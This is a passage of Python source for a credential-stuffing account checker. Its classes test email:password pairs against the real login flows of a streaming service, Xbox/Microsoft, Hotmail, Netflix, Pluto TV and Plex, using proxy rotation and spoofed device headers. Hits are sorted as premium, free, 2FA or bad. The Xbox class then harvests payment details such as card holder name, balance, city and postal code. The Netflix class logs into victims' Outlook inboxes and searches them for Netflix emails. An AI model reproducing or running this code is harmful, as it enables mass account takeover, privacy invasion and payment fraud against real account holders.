        for attempt in range(self.max_retry):
            try:
                return self._check_internal(email, password, proxy_str, attempt)
            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError, requests.exceptions.ProxyError):
                if attempt < self.max_retry - 1:
                    time.sleep(random.uniform(2, 5))
                    continue
                result["status"] = "error"
                result["message"] = "Network error"
                return result
            except Exception as e:
                if attempt < self.max_retry - 1:
                    time.sleep(random.uniform(2, 5))
                    continue
                result["status"] = "error"
                result["message"] = str(e)[:60]
                return result

        result["status"] = "error"
        result["message"] = "Max retries"
        return result

    def _check_internal(self, email, password, proxy_str, attempt):
        sess = self._session(proxy_str)
        device_id = str(uuid.uuid4())
        anonymous_id = str(uuid.uuid4())

        token_data = {
            "grant_type": "password",
            "username": email,
            "password": password,
            "scope": "offline_access",
            "client_id": self.brn_cid,
            "client_secret": self.brn_sec,
            "device_type": "Google SDK built for x86",
            "device_id": device_id,
            "device_name": "sdk_google_atv_x86",
        }
        token_headers = {
            "User-Agent": self.baron_ua,
            "Accept": "application/json",
            "Accept-Charset": "UTF-8",
            "Accept-Encoding": "gzip",
            "Connection": "Keep-Alive",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "ETP-Anonymous-ID": anonymous_id,
            "Request-Type": "SignIn",
        }
        r = sess.post(f"{self.brn_api}/auth/v1/token",
                      data=token_data,
                      headers=token_headers,
                      timeout=self.timeout)

        if r.status_code == 429:
            if attempt < self.max_retry - 1:
                time.sleep(random.uniform(5, 10))
                raise Exception("Rate limited")
            return {"status": "error", "message": "Rate limited"}

        if r.status_code in (401, 400) or "invalid_grant" in r.text or "invalid_credentials" in r.text:
            return {"status": "bad", "message": "Invalid credentials"}

        try:
            token_json = r.json()
        except:
            return {"status": "error", "message": "JSON parse error"}

        access_token = token_json.get("access_token")
        if not access_token:
            return {"status": "error", "message": "No access token"}

        def auth_headers():
            return {
                "Authorization": f"Bearer {access_token}",
                "User-Agent": self.baro_wua,
                "Accept": "application/json, text/plain, */*",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            }

        # Get account info
        r = sess.get(f"{self.brn_api}/accounts/v1/me", headers=auth_headers(), timeout=self.timeout)
        if r.status_code != 200:
            return {"status": "error", "message": "Account fetch failed"}
        account_data = r.json()
        external_id = account_data.get("external_id", "")
        account_id = account_data.get("account_id", "")
        email_verified = account_data.get("email_verified", False)
        username = account_data.get("username", "")

        if not username:
            try:
                r2 = sess.get(f"{self.brn_api}/accounts/v1/me/multiprofile", headers=auth_headers(), timeout=self.timeout)
                m = re.search(r'"username"\s*:\s*"([^"]+)"', r2.text)
                if m:
                    username = m.group(1)
            except:
                pass
        if not username:
            username = email.split("@")[0]

        info = {
            "user": username,
            "verified": "Yes" if email_verified else "No",
            "plan": "",
            "sku": "",
            "streams": "",
            "expires": "",
            "renew": "",
            "country": "",
            "payment": "",
        }

        if not external_id:
            return {"status": "free", "message": "No subscription", **info}

        # Get subscription benefits
        r = sess.get(f"{self.brn_api}/subs/v1/subscriptions/{external_id}/benefits",
                     headers=auth_headers(), timeout=self.timeout)
        if r.status_code != 200:
            return {"status": "free", "message": "No subscription", **info}

        benefits_text = r.text

        if "subscription.not_found" in benefits_text or '"total":0' in benefits_text or '"subscription_country":""' in benefits_text:
            return {"status": "free", "message": "No active subscription", **info}

        # Extract plan
        sm = re.search(r'"concurrent_streams\.(\d+)"', benefits_text)
        if sm:
            streams = sm.group(1)
            info["streams"] = streams
            info["plan"] = self.plan_map.get(streams, f"PLAN_{streams}")

        # Extract country
        cm = re.search(r'"subscription_country"\s*:\s*"([^"]+)"', benefits_text)
        if cm:
            cc = cm.group(1)
            info["country"] = self.country_map.get(cc, cc)

        # Extract payment source
        pm = re.search(r'"source"\s*:\s*"([^"]+)"', benefits_text)
        if pm:
            info["payment"] = pm.group(1)

        # Get subscription details
        if account_id:
            try:
                r = sess.get(f"{self.brn_api}/subs/v3/subscriptions/{account_id}",
                             headers=auth_headers(), timeout=self.timeout)
                if r.status_code == 200:
                    sub3 = r.text
                    em = re.search(r'"expiration_date"\s*:\s*"([^T"]+)', sub3)
                    if em:
                        info["expires"] = em.group(1)
                    rm = re.search(r'"auto_renew"\s*:\s*(true|false)', sub3)
                    if rm:
                        info["renew"] = "Yes" if rm.group(1) == "true" else "No"
                    sk = re.search(r'"sku"\s*:\s*"([^"]+)"', sub3)
                    if sk:
                        info["sku"] = sk.group(1)
            except:
                pass

        if info["plan"]:
            return {"status": "premium", "message": f"Plan: {info['plan']}, Country: {info['country']}, Expires: {info['expires']}", **info}
        else:
            return {"status": "free", "message": "No active subscription", **info}

# ----- 9. Xbox Checker -----
class XboxChecker:
    def __init__(self, proxy: Optional[str] = None):
        self.proxy = proxy

    def _get_proxy_dict(self):
        if not self.proxy:
            return None
        p = self.proxy.strip()
        if '://' in p:
            return {"http": p, "https": p}
        parts = p.split(':')
        if len(parts) == 2:
            return {"http": f"http://{parts[0]}:{parts[1]}", "https": f"http://{parts[0]}:{parts[1]}"}
        elif len(parts) == 4:
            return {"http": f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}",
                    "https": f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"}
        return None

    def _get_remaining_days(self, date_str):
        try:
            if not date_str:
                return "EXPIRED"
            date_str = date_str.replace('Z', '+00:00')
            try:
                renewal_date = datetime.fromisoformat(date_str)
            except:
                try:
                    renewal_date = datetime.strptime(date_str, "%Y-%m-%dT%H:%M:%S%z")
                except:
                    try:
                        renewal_date = datetime.strptime(date_str.split('+')[0].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                        renewal_date = renewal_date.replace(tzinfo=datetime.now().astimezone().tzinfo)
                    except:
                        return "UNKNOWN"
            today = datetime.now(renewal_date.tzinfo)
            remaining = (renewal_date - today).days
            if remaining < 0:
                return "EXPIRED"
            return str(remaining)
        except Exception:
            return "UNKNOWN"

    def check(self, email: str, password: str) -> Dict:
        max_retries = 1
        for attempt in range(max_retries):
            try:
                return self._check_internal(email, password)
            except (requests.exceptions.ConnectionError, requests.exceptions.Timeout, requests.exceptions.ProxyError) as e:
                if attempt == max_retries - 1:
                    return {"status": "error", "email": email, "password": password, "message": f"Network error: {str(e)[:80]}"}
                pass
                continue
        return {"status": "error", "email": email, "password": password, "message": "Max retries exceeded"}

    def _check_internal(self, email: str, password: str) -> Dict:
        result = {"status": "error", "email": email, "password": password, "message": ""}
        proxy_dict = self._get_proxy_dict()
        session = requests.Session()
        if proxy_dict:
            session.proxies.update(proxy_dict)

        correlation_id = str(uuid.uuid4())
        pass

        url1 = "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress=" + email
        headers1 = {
            "X-OneAuth-AppName": "Outlook Lite",
            "X-Office-Version": "3.11.0-minApi24",
            "X-CorrelationId": correlation_id,
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
            "Host": "odc.officeapps.live.com",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip"
        }
        r1 = session.get(url1, headers=headers1, timeout=15)

        if "Neither" in r1.text or "Both" in r1.text or "Placeholder" in r1.text or "OrgId" in r1.text:
            return {"status": "bad", "message": "Not a Microsoft account"}
        if "MSAccount" not in r1.text:
            return {"status": "bad", "message": "Not a Microsoft account"}

        time.sleep(0.3)

        url2 = ("https://login.live.com/oauth20_authorize.srf?"
                "client_id=0000000048170EF2"
                "&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf"
                "&response_type=code"
                "&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL"
                "&display=touch&username=" + email)

        headers2 = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive"
        }
        r2 = session.get(url2, headers=headers2, allow_redirects=True, timeout=15)

        url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
        ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)

        if not url_match or not ppft_match:
            return {"status": "bad", "message": "Login page parse failed"}

        post_url = url_match.group(1).replace("\\/", "/")
        ppft = ppft_match.group(1)

        login_data = ("i13=1&login=" + email + "&loginfmt=" + email +
                      "&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=" +
                      "&passwd=" + password +
                      "&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=" +
                      "&canary=&ctx=&hpgrequestid=&PPFT=" + ppft +
                      "&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0" +
                      "&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0" +
                      "&isRecoveryAttemptPost=0&i19=9960")

        headers3 = {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Origin": "https://login.live.com",
            "Referer": r2.url
        }
        r3 = session.post(post_url, data=login_data, headers=headers3, allow_redirects=False, timeout=15)

        if "account or password is incorrect" in r3.text:
            return {"status": "bad", "message": "Invalid credentials"}

        if "https://account.live.com/identity/confirm" in r3.text:
            return {"status": "2fa", "message": "2FA required"}

        if "https://account.live.com/Abuse" in r3.text:
            return {"status": "bad", "message": "Banned"}

        if "too many" in r3.text.lower() or "locked out" in r3.text.lower() or "try again later" in r3.text.lower():
            return {"status": "error", "message": "Rate limited"}

        if "0x80049DD3" in r3.text:
            return {"status": "error", "message": "No consent"}

        hr_match = re.search(r'HR=0x([0-9A-Fa-f]+)', r3.text)
        if hr_match and len(r3.text) < 5000:
            return {"status": "error", "message": f"HR=0x{hr_match.group(1)}"}

        location = r3.headers.get("Location", "")
        if not location:
            return {"status": "bad", "message": "No redirect"}

        code_match = re.search(r'code=([^&]+)', location)
        if not code_match:
            return {"status": "bad", "message": "No code"}

        code = code_match.group(1)

        token_data = ("client_id=0000000048170EF2"
                      "&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf"
                      "&grant_type=authorization_code&code=" + code +
                      "&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL")

        r4 = session.post("https://login.live.com/oauth20_token.srf",
                          data=token_data,
                          headers={"Content-Type": "application/x-www-form-urlencoded"},
                          timeout=15)

        if "access_token" not in r4.text:
            return {"status": "bad", "message": "Token exchange failed"}

        token_json = r4.json()
        access_token = token_json["access_token"]

        country = ""
        name = ""

        # Payment auth
        time.sleep(0.3)
        user_id = str(uuid.uuid4()).replace('-', '')[:16]
        state_json = json.dumps({"userId": user_id, "scopeSet": "pidl"})
        payment_auth_url = ("https://login.live.com/oauth20_authorize.srf?"
                            "client_id=000000000004773A"
                            "&response_type=token"
                            "&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete"
                            "&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth"
                            "&state=" + urlparse.quote(state_json) + "&prompt=none")

        headers6 = {
            "Host": "login.live.com",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "keep-alive",
            "Referer": "https://account.microsoft.com/"
        }
        r6 = session.get(payment_auth_url, headers=headers6, allow_redirects=True, timeout=10)

        payment_token = None
        search_text = r6.text + " " + r6.url
        for pattern in [r'access_token=([^&\s"\']+)', r'"access_token":"([^"]+)"']:
            match = re.search(pattern, search_text)
            if match:
                payment_token = urlparse.unquote(match.group(1))
                break

        if not payment_token:
            return {"status": "free", "message": "No payment token (free account)"}

        payment_data = {"country": country, "name": name}
        correlation_id2 = str(uuid.uuid4())

        payment_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Pragma": "no-cache",
            "Accept": "application/json",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9",
            "Authorization": 'MSADELEGATE1.0="' + payment_token + '"',
            "Connection": "keep-alive",
            "Content-Type": "application/json",
            "Host": "paymentinstruments.mp.microsoft.com",
            "ms-cV": correlation_id2,
            "Origin": "https://account.microsoft.com",
            "Referer": "https://account.microsoft.com/",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site"
        }

        # Get payment instruments
        payment_url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US"
        r7 = session.get(payment_url, headers=payment_headers, timeout=15)
        if r7.status_code == 200:
            balance_match = re.search(r'"balance"\s*:\s*([0-9.]+)', r7.text)
            if balance_match:
                payment_data['balance'] = "$" + balance_match.group(1)
            card_match = re.search(r'"paymentMethodFamily"\s*:\s*"credit_card".*?"name"\s*:\s*"([^"]+)"', r7.text, re.DOTALL)
            if card_match:
                payment_data['card_holder'] = card_match.group(1)
            country_match = re.search(r'"country"\s*:\s*"([^"]+)"', r7.text)
            if country_match:
                payment_data['country'] = country_match.group(1)
            zip_match = re.search(r'"postal_code"\s*:\s*"([^"]+)"', r7.text)
            if zip_match:
                payment_data['zipcode'] = zip_match.group(1)
            city_match = re.search(r'"city"\s*:\s*"([^"]+)"', r7.text)
            if city_match:
                payment_data['city'] = city_match.group(1)

        # Check subscriptions
        sub_urls = [
            "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/subscriptions",
            "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions"
        ]

        premium_keywords = {
            'Xbox Game Pass Ultimate': 'GAME PASS ULTIMATE',
            'Game Pass Ultimate': 'GAME PASS ULTIMATE',
            'PC Game Pass': 'PC GAME PASS',
            'Xbox Game Pass for Console': 'XBOX GAME PASS CONSOLE',
            'Xbox Game Pass Core': 'GAME PASS CORE',
            'Game Pass Core': 'GAME PASS CORE',
            'Xbox Game Pass': 'GAME PASS',
            'Game Pass': 'GAME PASS',
            'Xbox Live Gold': 'XBOX LIVE GOLD',
            'EA Play': 'EA PLAY',
        }

        all_text = ""
        for sub_url in sub_urls:
            try:
                r8 = session.get(sub_url, headers=payment_headers, timeout=15)
                if r8.status_code == 200:
                    all_text += r8.text + "\n"
            except:
                continue

        if not all_text:
            return {"status": "free", "message": "No subscription data", **payment_data}

        all_dates = re.findall(r'"(?:nextRenewalDate|expirationDate|validTo)"\s*:\s*"([^"]+)"', all_text)

        found_type = None
        for keyword, type_name in premium_keywords.items():
            if keyword.lower() in all_text.lower():
                found_type = type_name
                break

        if not found_type:
            return {"status": "free", "message": "No premium subscription found", **payment_data}

        best_date = None
        best_days = -1
        for date_str in all_dates:
            days = self._get_remaining_days(date_str)
            if days.isdigit():
                days_int = int(days)
                if days_int > best_days:
                    best_days = days_int
                    best_date = date_str

        auto_match = re.search(r'"autoRenew"\s*:\s*(true|false)', all_text)
        auto_renew = "YES" if (auto_match and auto_match.group(1) == "true") else "NO"

        if best_days > 0:
            sub_data = {
                'premium_type': found_type,
                'renewal_date': best_date,
                'days_remaining': str(best_days),
                'auto_renew': auto_renew
            }
            amount_match = re.search(r'"totalAmount"\s*:\s*([0-9.]+)', all_text)
            if amount_match:
                sub_data['total_amount'] = amount_match.group(1)
            currency_match = re.search(r'"currency"\s*:\s*"([^"]+)"', all_text)
            if currency_match:
                sub_data['currency'] = currency_match.group(1)
            result = {"status": "premium", "message": f"{found_type} | {best_days} days remaining", **payment_data, **sub_data}
            return result
        else:
            result = {"status": "expired", "message": f"{found_type} (expired)", **payment_data,
                      'premium_type': found_type, 'renewal_date': best_date, 'days_remaining': '0'}
            return result

# ----- 10. Hotmail Checker -----
class HotmailChecker:
    def __init__(self, proxy: Optional[str] = None):
        self.proxy = proxy
        self.timeout = 30

    def check(self, email: str, password: str) -> Dict:
        max_retries = 1
        for attempt in range(max_retries):
            try:
                return self._check_internal(email, password)
            except (requests.exceptions.ConnectionError, requests.exceptions.Timeout, requests.exceptions.ProxyError) as e:
                if attempt == max_retries - 1:
                    return {"status": "error", "message": f"Network error: {str(e)[:80]}"}
                pass
                continue
        return {"status": "error", "message": "Max retries exceeded"}

    def _check_internal(self, email, password):
        proxies = None
        if self.proxy:
            proxies = {"http": self.proxy, "https": self.proxy}

        session = requests.Session()
        if proxies:
            session.proxies.update(proxies)
        session.verify = False
        correlation_id = str(uuid.uuid4())

        url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
        headers1 = {
            "X-OneAuth-AppName": "Outlook Lite",
            "X-Office-Version": "3.11.0-minApi24",
            "X-CorrelationId": correlation_id,
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
            "Host": "odc.officeapps.live.com",
            "Connection": "Keep-Alive"
        }
        r1 = session.get(url1, headers=headers1, timeout=self.timeout)
        txt1 = r1.text

        if "Neither" in txt1 or "Both" in txt1 or "Placeholder" in txt1 or "OrgId" in txt1:
            return {"status": "bad", "message": "Not a Microsoft account"}
        if "MSAccount" not in txt1:
            return {"status": "bad", "message": "Not a Microsoft account"}

        time.sleep(0.3)

        url2 = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
        headers2 = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive"
        }
        r2 = session.get(url2, headers=headers2, allow_redirects=True, timeout=self.timeout)

        url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
        ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)

        if not url_match or not ppft_match:
            return {"status": "bad", "message": "Failed to get PPFT"}

        post_url = url_match.group(1).replace("\\/", "/")
        ppft = ppft_match.group(1)

        login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"

        headers3 = {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Origin": "https://login.live.com",
            "Referer": r2.url
        }
        r3 = session.post(post_url, data=login_data, headers=headers3, allow_redirects=False, timeout=self.timeout)
        response_text = r3.text.lower()

        if "account or password is incorrect" in response_text or r3.text.count("error") > 0:
            return {"status": "bad", "message": "Invalid credentials"}

        if "https://account.live.com/identity/confirm" in r3.text or "identity/confirm" in response_text:
            return {"status": "2fa", "message": "2FA required"}
        if "https://account.live.com/Consent" in r3.text or "consent" in response_text:
            return {"status": "2fa", "message": "2FA required"}

        if "https://account.live.com/Abuse" in r3.text:
            return {"status": "bad", "message": "Banned"}

        location = r3.headers.get("Location", "")
        if not location:
            return {"status": "bad", "message": "No redirect"}

        code_match = re.search(r'code=([^&]+)', location)
        if not code_match:
            return {"status": "bad", "message": "No code"}

        return {"status": "premium", "message": "Hotmail valid"}

# ----- 11. Netflix Checker (uses Hotmail validator + inbox search) -----
class NetflixChecker:
    def __init__(self, proxy: Optional[str] = None):
        self.proxy = proxy
        self.hotmail_checker = HotmailChecker(proxy)
        self.netflix_keywords = [
            "info@account.netflix.com",
            "netflix",
            "Netflix: Your sign-in code",
            "Welcome to Netflix",
            "Welcome back to Netflix",
            "Your email address has been changed",
            "Netflix: Ihr Anmeldecode",
            "Netflix : votre code d'identification",
            "Netflix: tu código de inicio de sesión",
            "Netflix：ログインコード",
            "Netflix: il tuo codice di accesso",
            "Netflix: seu código de acesso",
            "Netflix: رمز تسجيل الدخول الخاص بك",
            "Netflix : votre code de connexion",
            "Netflix: o teu código de início de sessão",
            "Netflix: je inlogcode",
            "Netflix: Twój kod logowania",
            "Netflix: Oturum açma kodunuz",
            "Netflix: Din inloggningskod",
            "Netflix: Din logind-kode",
            "Netflix: Innloggingskoden din",
            "Netflix: Kirjautumiskoodisi",
            "넷플릭스: 로그인 코드",
            "Netflix：您的登录验证码",
            "Netflix：登入碼",
            "Netflix: आपका साइन-इन कोड",
            "Netflix: Kode masuk Anda",
            "Netflix: Mã đăng nhập của bạn",
            "Netflix: Váš přihlašovací kód",
            "Netflix: A bejelentkezési kódod",
            "Netflix: Codul tău de conectare",
            "Netflix: Ваш код входу",
            "Netflix: Ο κωδικός σύνδεσής σας",
            "Netflix: รหัสการเข้าสู่ระบบของคุณ",
            "נטפליקס: קוד הכניסה שלך",
            "Netflix: Vaš kod za prijavu",
            "Netflix: ваш код входа"
        ]

    def _search_inbox(self, email, password):
        hotmail_result = self.hotmail_checker.check(email, password)
        if hotmail_result.get("status") not in ["premium", "2fa"]:
            return hotmail_result

        try:
            proxies = None
            if self.proxy:
                proxies = {"http": self.proxy, "https": self.proxy}

            session = requests.Session()
            session.verify = False
            if proxies:
                session.proxies.update(proxies)

            url2 = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            headers2 = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "keep-alive"
            }
            r2 = session.get(url2, headers=headers2, allow_redirects=True, timeout=self.hotmail_checker.timeout)

            url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)

            if not url_match or not ppft_match:
                return {"status": "free", "message": "Hotmail valid but inbox not accessible"}

            post_url = url_match.group(1).replace("\\/", "/")
            ppft = ppft_match.group(1)

            login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"
            headers3 = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Origin": "https://login.live.com",
                "Referer": r2.url
            }
            r3 = session.post(post_url, data=login_data, headers=headers3, allow_redirects=False, timeout=self.hotmail_checker.timeout)

            location = r3.headers.get("Location", "")
            if not location:
                return {"status": "free", "message": "Hotmail valid but no token"}

            code_match = re.search(r'code=([^&]+)', location)
            if not code_match:
                return {"status": "free", "message": "No code"}

            code = code_match.group(1)

            r4 = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
                data={
                    "client_info": "1",
                    "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                    "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
                    "grant_type": "authorization_code",
                    "code": code,
                    "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
                },
                timeout=self.hotmail_checker.timeout
            )

            token_json = r4.json()
            access_token = token_json.get('access_token')
            if not access_token:
                return {"status": "free", "message": "Hotmail valid but no access token"}

            found_keywords = []
            for keyword in self.netflix_keywords:
                try:
                    search_url = f"https://outlook.live.com/search/api/v2/query?n=124"
                    headers_search = {
                        "User-Agent": "Outlook-Android/2.0",
                        "Authorization": f"Bearer {access_token}",
                        "X-AnchorMailbox": "CID" + str(uuid.uuid4()),
                        "Content-Type": "application/json"
                    }
                    json_payload = {
                        "Cvid": str(uuid.uuid4()),
                        "Scenario": {"Name": "owa.react"},
                        "TimeZone": "United Kingdom Standard Time",
                        "EntityRequests": [{
                            "EntityType": "Conversation",
                            "ContentSources": ["Exchange"],
                            "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}},
                                              {"Term": {"DistinguishedFolderName": "DeletedItems"}}]},
                            "From": 0,
                            "Query": {"QueryString": keyword},
                            "Size": 25,
                            "Sort": [{"Field": "Score", "SortDirection": "Desc", "Count": 3},
                                     {"Field": "Time", "SortDirection": "Desc"}],
                            "EnableTopResults": True,
                            "TopResultsCount": 3
                        }]
                    }
                    r_search = session.post(search_url, headers=headers_search, json=json_payload, timeout=self.hotmail_checker.timeout)
                    if r_search.status_code == 200:
                        data = r_search.json()
                        total = data.get("EntitySets", [{}])[0].get("ResultSets", [{}])[0].get("Total", 0)
                        if total > 0:
                            found_keywords.append(keyword)
                except:
                    continue

            if found_keywords:
                email_changed = any(k in r_search.text for k in ["Your email address has been changed", "Email changed", "email address has been changed"])
                if email_changed:
                    return {"status": "free", "message": "Hotmail valid, Netflix found but email changed"}
                return {"status": "premium", "message": f"Netflix hit! Keywords: {', '.join(found_keywords)}", "keywords": found_keywords}
            else:
                return {"status": "free", "message": "Hotmail valid, no Netflix emails"}

        except Exception as e:
            return {"status": "error", "message": f"Netflix inbox search error: {str(e)[:80]}"}

    def check(self, email: str, password: str) -> Dict:
        max_retries = 2
        for attempt in range(max_retries):
            try:
                return self._search_inbox(email, password)
            except Exception as e:
                if attempt == max_retries - 1:
                    return {"status": "error", "message": str(e)[:80]}
                pass
        return {"status": "error", "message": "Max retries"}


# ----- 13. Pluto TV Checker -----
class PlutoChecker:
    def __init__(self, proxy=None, timeout=12):
        self.proxy = proxy
        self.timeout = timeout

    def check(self, email: str, password: str, proxy=None) -> Dict:
        proxy = proxy or self.proxy
        max_retries = 1
        for attempt in range(max_retries):
            try:
                return self._check_internal(email, password, proxy)
            except Exception as e:
                if attempt == max_retries - 1:
                    return {"status": "error", "message": str(e)[:80]}
                pass
        return {"status": "error", "message": "Max retries"}

    def _check_internal(self, email, password, proxy):
        session = requests.Session()
        device_id = str(uuid.uuid4())
        session.cookies.set("ptv_device_id", device_id)
        if proxy:
            session.proxies = {"http": proxy, "https": proxy}
        headers = {
            'accept': 'application/json, text/plain, */*',
            'content-type': 'application/json',
            'origin': 'https://pluto.tv',
            'referer': 'https://pluto.tv/us/account/sign-in/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
            'request-source': 'signIn',
        }
        query = """mutation SignIn($formFields: SignInFormFields!) {
          signIn(formFields: $formFields) { userId success message messages maxLoginAttempts }
        }"""
        payload = {
            "query": query,
            "variables": {"formFields": {"email": email, "password": password, "rememberMe": 1}},
            "operationName": "SignIn"
        }
        resp = session.post("https://pluto.tv/api/tn/signup/graphql/", json=payload, headers=headers, timeout=self.timeout)
        if resp.status_code != 200:
            return {"status": "error", "message": f"HTTP {resp.status_code}"}
        data = resp.json()
        if 'errors' in data:
            err = data['errors'][0] if data['errors'] else {}
            code = err.get('extensions', {}).get('code', '')
            if code == 'INVALID_CREDENTIALS':
                return {"status": "bad", "message": "Invalid credentials"}
            return {"status": "error", "message": err.get('message', 'error')}
        signin = data.get('data', {}).get('signIn') or {}
        if not signin.get('success'):
            msg = signin.get('message') or ', '.join(signin.get('messages') or []) or 'Login failed'
            return {"status": "bad", "message": msg}
        return {
            "status": "valid",
            "user_id": signin.get('userId'),
            "message": f"UserID: {signin.get('userId')} | Type: FREE",
            "country": "",
        }

# ----- 14. Plex Checker -----
class PlexChecker:
    def __init__(self, proxy=None, timeout=12):
        self.proxy = proxy
        self.timeout = timeout

    def check(self, email: str, password: str, proxy=None) -> Dict:
        proxy = proxy or self.proxy
        max_retries = 1
        for attempt in range(max_retries):
            try:
                return self._check_internal(email, password, proxy)
            except Exception as e:
                if attempt == max_retries - 1:
                    return {"status": "error", "message": str(e)[:80]}
                pass
        return {"status": "error", "message": "Max retries"}

    def _check_internal(self, email, password, proxy):
        try:
            session = curl_requests.Session()
            (setattr(session, "impersonate", "chrome131") if HAS_CFFI else None)
        except Exception:
            session = requests.Session()
        if proxy:
            session.proxies = {"http": proxy, "https": proxy}
        headers = {
            'Content-Type': 'application/json',
            'x-plex-client-identifier': str(uuid.uuid4()),
            'x-plex-device': 'Android',
            'x-plex-platform': 'Chrome',
            'x-plex-product': 'Plex Mediaverse',
